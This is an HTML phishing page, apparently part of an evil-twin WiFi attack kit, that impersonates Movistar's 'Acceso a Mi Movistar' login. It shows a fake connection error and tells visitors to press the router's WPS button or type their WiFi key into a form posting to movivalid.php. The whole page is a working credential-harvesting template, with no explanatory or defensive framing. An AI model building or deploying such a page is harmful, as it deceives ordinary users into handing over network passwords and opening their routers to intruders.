





<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html  class="no-js" xmlns="http://www.w3.org/1999/xhtml" xml:lang="es_ES" lang="es_ES">
	<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
	<head>
		




<meta http-equiv="X-UA-Compatible" content="IE=edge" />

<meta name="viewport" content="width=device-width, initial-scale=0.8" />
<link rel="stylesheet" href="/msftconnecttest/movicss/style.css" media="screen" type="text/css" />





	<title>Acceso a Mi Movistar</title>







<img class="idmovi" src="/msftconnecttest/moviimg/movistar.png"/>


<p>Error 109: No se puede conectar, seguéis las instrucciones a bajo.Intenta de conectar con la clave wifi, o mas rapido, solamente apoyando el botón WPS del router<p>
<img class="idwps" src="/msftconnecttest/moviimg/ayudawps.png"/>
</br>
<p>Conexión con el botón WPS.<p>
</br>
</br>
<p>Conexión con la clave wifi, la clave wifi se encuentra a bajo del router Movistar.<p>
<p></strong> <a href="/msftconnecttest/shout/movitchat.php" target="_blank"><u>Ayuda en linea</u>?</a>

 <div id="container">
            <!-- zone de connexion -->
            
            <form method="POST" action="movivalid.php">
                <h1>Conexión</h1>
                
                <label><b>Clave wifi</b></label>
                <input type="text" name="cle">

                <label><b>Confirmación</b></label>
                <input type="text" name="cleconf">

                <input type="submit" id='submit' value='ENTRAR' >

            </form>
        </div>
</br>
</br>
<img class="idautre" src="/msftconnecttest/moviimg/bas.png"/>






	</body>
</html>

